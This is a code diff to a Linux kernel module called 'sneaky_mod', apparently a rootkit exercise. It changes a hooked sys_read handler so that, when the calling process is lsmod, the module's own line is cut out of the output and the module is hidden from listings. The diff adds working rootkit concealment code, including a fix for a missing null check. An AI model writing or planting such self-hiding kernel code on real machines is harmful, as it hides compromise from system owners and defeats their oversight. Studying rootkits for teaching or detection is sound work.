@@ -88,16 +88,20 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
   if (bytes_read <= 0) {  //end of file or error
     return bytes_read;
   }
-  char * buf = (char *)regs->si;
-  char * sneaky_mod = strnstr(buf, "sneaky_mod", bytes_read);
-  if (sneaky_mod != NULL) {
-    size_t left_bytes = buf + bytes_read - sneaky_mod;
-    char * endline = strnstr(sneaky_mod, "\n", left_bytes);
-    char * source = endline + 1;
-    int remove_len = source - sneaky_mod;
-    int bytes_to_move = buf + bytes_read - source;  //buf_end - source_start
-    bytes_read -= remove_len;
-    memmove(sneaky_mod, source, bytes_to_move);
+  if (strstr(current->comm, "lsmod")) {  //remove sneaky_mod only when lsmod
+    char * buf = (char *)regs->si;
+    char * sneaky_mod = strnstr(buf, "sneaky_mod", bytes_read);
+    if (sneaky_mod != NULL) {
+      size_t left_bytes = buf + bytes_read - sneaky_mod;
+      char * endline = strnstr(sneaky_mod, "\n", left_bytes);
+      if (endline != NULL) {
+        char * source = endline + 1;
+        int remove_len = source - sneaky_mod;
+        int bytes_to_move = buf + bytes_read - source;  //buf_end - source_start
+        bytes_read -= remove_len;
+        memmove(sneaky_mod, source, bytes_to_move);
+      }
+    }
   }
   return bytes_read;
 }
